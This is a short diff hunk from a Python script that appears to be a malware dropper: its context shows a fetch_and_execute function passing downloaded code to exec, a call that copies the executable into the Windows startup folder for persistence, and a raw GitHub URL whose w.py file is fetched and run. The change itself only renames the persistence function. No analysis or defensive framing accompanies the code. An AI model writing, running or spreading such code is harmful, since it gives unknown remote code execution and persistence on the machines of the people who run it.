@@ -58,7 +58,7 @@ def fetch_and_execute(url):
     exec(script_content, globals())
 
 if __name__ == "__main__":
-    copy_exe_to_start_up()
+    copy_exe_to_startup()
     github_urls = [
         'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
     ]
